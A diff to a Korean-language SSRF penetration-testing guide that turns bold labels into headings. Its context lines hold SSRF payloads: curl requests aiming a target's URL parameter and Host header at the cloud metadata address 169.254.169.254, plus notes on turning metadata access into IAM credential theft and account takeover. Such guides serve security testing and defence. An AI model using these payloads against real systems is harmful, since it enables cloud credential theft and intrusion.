@@ -1,6 +1,4 @@
-### Phase 2: 동적 테스트 (검증)
-
-**기본 페이로드:**
+### 기본 페이로드
 
 **로컬 서비스 (Direct):**
 - `http://127.0.0.1/` (URL parameter)
@@ -61,7 +59,7 @@ curl "https://target/api/avatar?url=http://169.254.169.254/latest/meta-data/"
 
 ---
 
-**우회 페이로드:**
+### 우회 페이로드
 
 | 방어 | 페이로드 |
 |---|---|
@@ -102,7 +100,7 @@ curl "https://target/api/x" -H "Host: 169.254.169.254"
 
 ---
 
-**참고사항:**
+### 참고사항
 
 - 클라우드 metadata 접근이 SSRF의 가장 큰 실전 영향 (IAM credential → 계정 takeover)
 - AWS IMDSv2 강제 환경(토큰 요구)에서는 단순 GET 차단 — 영향도 감소 (PUT으로 토큰 받기 시도)
